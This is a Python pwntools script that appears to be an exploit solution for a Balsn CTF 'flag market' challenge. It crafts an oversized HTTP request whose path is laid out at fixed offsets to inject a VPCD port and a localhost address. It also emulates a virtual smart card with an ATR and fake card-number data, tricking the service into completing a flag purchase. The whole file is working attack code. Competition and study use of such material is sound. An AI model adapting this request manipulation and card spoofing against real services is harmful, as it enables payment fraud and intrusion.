#!/usr/bin/env python3
from pwn import *


def connect():
    # return remote("flag-market-us.balsnctf.com", 19091)
    return remote("localhost", 19091)


VPCDPORT = 35963
MAX_REQ_BUF = 1024
ATR = b"\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2"


def edit(x, i, y):
    x[i : i + len(y)] = y


def edit_no_x00(x, i, y):
    assert b"\x00" not in y
    edit(x, i, y)


def main():
    with connect() as tube1:
        tube1.send(b"BUY_FLAG /buy_flag HTTP/1.1")
        with connect() as tube2:
            path = flat(
                {
                    384: str(VPCDPORT) + ".",  # atoi()
                    384 * 2: "127.0.0.1",
                }
            )
            req = bytearray(MAX_REQ_BUF)
            request_line = b"XX /" + path + b" HTTP/1.1\r\n"
            edit_no_x00(req, 0, request_line)
            edit_no_x00(req, 0, struct.pack(">H", len(request_line) - 2))
            card = (
                b"M3OW/ME0W".ljust(32, b"\x00")
                + b"4518961863728788".ljust(20, b"\x00")
                + struct.pack("<HHHHI", 2222, 12, 618, 0, 1337313370)
                + b"\x90\x00"
            )
            edit(
                req,
                len(request_line),
                b"".join(
                    (
                        struct.pack(">H", len(ATR)) + ATR,
                        b"\x00\x02\x90\x00",
                        struct.pack(">H", len(card)) + card,
                    )
                ),
            )
            tube2.send(req)
            tube2.interactive()
        tube1.interactive()


if __name__ == "__main__":
    main()
